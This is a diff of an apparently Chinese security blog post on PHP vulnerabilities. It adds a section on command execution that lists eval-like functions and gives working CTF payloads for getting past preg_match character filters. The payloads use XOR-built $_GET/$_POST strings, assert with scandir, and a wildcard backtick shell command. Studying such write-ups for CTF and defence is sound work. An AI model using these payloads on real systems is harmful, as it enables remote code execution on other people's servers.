@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">394</span>
+            <span class="post-count">961</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -140,16 +140,41 @@
 <li><code>md5([1])===md5([2])==NULL</code></li>
 </ol>
 <h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><h2 id="0x03-命令执行"><a href="#0x03-命令执行" class="headerlink" title="0x03 命令执行"></a>0x03 命令执行</h2><p>命令执行函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace()</span><br></pre></td></tr></table></figure>
 
 
 
 
 
+<h4 id="绕过数字和字母"><a href="#绕过数字和字母" class="headerlink" title="绕过数字和字母"></a>绕过数字和字母</h4><p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423173117812.png" alt="image-20220423173117812"></p>
+<p>post 请求构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="variable">$_</span>++;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$_</span>);</span><br><span class="line">	<span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);</span><br><span class="line">	<span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);        <span class="comment"># p</span></span><br><span class="line">    <span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);</span><br><span class="line">    <span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);</span><br><span class="line">    <span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    _POST</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172539634.png" alt="image-20220423172539634"></p>
+<p>get</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    _GET</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172618113.png" alt="image-20220423172618113"></p>
+<p>即：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	var_dump(<span class="string">&quot;#./|&#123;&quot;</span>^<span class="string">&quot;|~`//&quot;</span>); <span class="comment">//_POST</span></span><br><span class="line">	var_dump(<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>);   <span class="comment">//_GET</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172820891.png" alt="image-20220423172820891"></p>
+<p>执行命令</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=getFlag</span><br><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=assert&amp;__=print_r(`scandir`(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);  -》 <span class="variable">$_GET</span>[_](<span class="variable">$_GET</span>[__]);  _当作变量传进去执行getFlag()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">思路一：绕过字符和数字</span><br><span class="line">code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line">1.成功 preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code)</span><br><span class="line">2.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line">3.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">思路二：绕过字符和数字+下划线（变量_和__）</span><br><span class="line">code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();</span><br><span class="line">1.成功 preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code)</span><br><span class="line">2.成功 preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line">3.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line">- ?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;+&#x3D;getFlag</span><br><span class="line">- ?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;_&#x3D;assert&amp;__&#x3D;print_r(&#96;scandir&#96;(&#39;&#x2F;&#39;))</span><br><span class="line"></span><br><span class="line">思路三：绕过字符和数字+下划线（变量_和__）+美元符号（$）</span><br><span class="line">1.均失败</span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line"></span><br><span class="line">【最终答案】</span><br><span class="line">思路四：采用通配符绕过美元符号（$）</span><br><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? &#x2F;????&#96;?&gt;</span><br><span class="line">?code&#x3D;?%3E%3C?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;?%3E</span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code) + 长度限制</span><br><span class="line"></span><br><span class="line">数字+字母：通过异或构造GET或POST请求实现绕过</span><br><span class="line"></span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">数字+字母+下划线：构造payload并通过 $&#123;&#125;[’+’] () 替换下划线</span><br><span class="line"></span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">数字+字母+下划线+美元符：通过通配符（?）实现替换</span><br></pre></td></tr></table></figure>
 
 
 
 
+
+<p>参考：</p>
+<p>津门杯CTF<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/llllXAv_xt30uUTwc5DGgQ">https://mp.weixin.qq.com/s/llllXAv_xt30uUTwc5DGgQ</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></p>
 <h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_19980431/article/details/83018232">参考</a></p>
 <hr>
  
